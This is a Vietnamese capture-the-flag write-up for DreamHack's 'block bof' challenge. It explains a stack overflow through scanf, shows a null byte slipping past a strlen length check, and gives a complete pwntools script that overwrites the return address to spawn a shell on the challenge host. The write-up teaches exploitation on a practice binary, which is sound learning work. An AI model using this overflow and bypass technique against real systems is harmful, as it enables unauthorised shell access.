# block-bof---Write-up-----DreamHack
Hướng dẫn cách giải bài block bof cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 3/12/2025

## 1. Mục tiêu cần làm
Đầu tiên chúng ta cần đọc file dịch ngược nó như nào đã.

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[10]; // [rsp+6h] [rbp-3Ah] BYREF
  char v5[48]; // [rsp+10h] [rbp-30h] BYREF

  init(argc, argv, envp);
  puts("Hello, Can you Get shell???");
  puts("It's unexploitable program XDDDDD");
  puts("what is your name??");
  read(0, buf, 10uLL);
  printf("OPPS %sCan you exploit This Program?\n", buf);
  printf("Your commnet : ");
  __isoc99_scanf("%s", v5);
  check(v5);
  puts("Very EEEEEZ XDDDDDD\n");
  puts("Bye Bye ~~\n");
  return 0;
}
```

Hmmmm chúng ta không thể thực thi Buffer Overflow ở biến `buf` được vì nó nhận đúng 10 byte, giờ nhìn sang `__isoc99_scanf("%s", v5);`, đây rồi, thằng này nó sẽ bú liếm hết cho đến khi gặp khoảng trắng hoặc xuống dòng. Vậy là quá dễ chỉ cần ghi hơn 48 byte + 8 byte của `saved RBP` là đè tới `saved RIP` rồi.

## 2. Cách thực thi
Giờ chúng ta tìm xem bài này có hàm gì để in cờ hay chiếm quyền điều khiển không ? 

```C
int get_sehll()
{
  printf("U R Best HACKER!");
  return execve("/bin/sh", 0LL, 0LL);
}
```

Đây rồi chính là nó, vậy là có địa chỉ `get_shell`, tính được offset từ `v5` đến `saved RIP` là 56 rồi ( 48 byte của `v5` và 8 byte của `saved RBP` ). Nhưng nhưng nhưng hãy nhìn kĩ vô hàm `main` đi, các bạn đã bỏ qua nó rồi. Đó là hàm `check()`.

```C
__int64 __fastcall check(const char *a1)
{
  if ( strlen(a1) > 15 )
  {
    puts("Very long comment XDDD\n");
    exit(0);
  }
  puts("Hmm.. It's real??\n");
  return 0LL;
}
```

Nếu độ dài `v5` dài quá 15 thì nó tự động ngắt chương trình luôn, không còn cơ hội. Nhưng mà chúng ta phải nhập hơn 56 byte lận ( 56 > 15 ). Vậy phải làm sao đây ? Như mình nói ở thằng `scan` thì nó sẽ bú liếm hết tất cả byte bạn nhập vào kể cả byte null ( \x00 ). Mà thằng `strlen` này khi gặp null là tắt điện ngay. 

Ví dụ bạn có 1 biến dài 10 byte, mình cho thằng byte thứ 5 là null thì khi `strlen` chạy nó sẽ in ra 5 thôi. Nó chỉ đếm từ đầu đến khi gặp null là dừng. Vậy thì chúng ta chỉ cần chèn null vào ở giữa từ 1 đến 15 byte đầu của payload là được. Mình sẽ để nó ở đầu luôn cho nó tiện.

```Python
ret = 0x000000000040101a

payload = b'\x00'
payload += b'A' * 47
payload += b'A' * 8
payload += p64(ret)
payload += p64(shell_add)
```

Bài này các bạn nhớ thêm `ret` nha vì luật 16 byte bất thành văn. Giờ thì chúng ta đã thành công bắt em `saved RIP` múp rụp chạy vào địa chi`get_shell` rồi. Giờ chúng ta sẽ cho nổ tung cái shellcode thôi.

Vậy là xong bài block bof, bài này khá dễ, nó giúp chúng ta hiểu rõ hơn về các lệnh như `scan`, `strlen`,... Nếu thấy hay thì cho mình 1 star để có động lực ra write-up mới nha 🐧.


```Python
 from pwn import *

#p = process('./block_bof')
p = remote('host8.dreamhack.games', 9016)
e = ELF('./block_bof')

shell_add = e.symbols['get_sehll']

payload = b'A' * 10

p.sendlineafter(b'what is your name??', payload )

ret = 0x000000000040101a

payload = b'\x00'
payload += b'A' * 47
payload += b'A' * 8
payload += p64(ret)
payload += p64(shell_add)

p.sendafter(b'Your commnet : ', payload)

p.interactive()
```
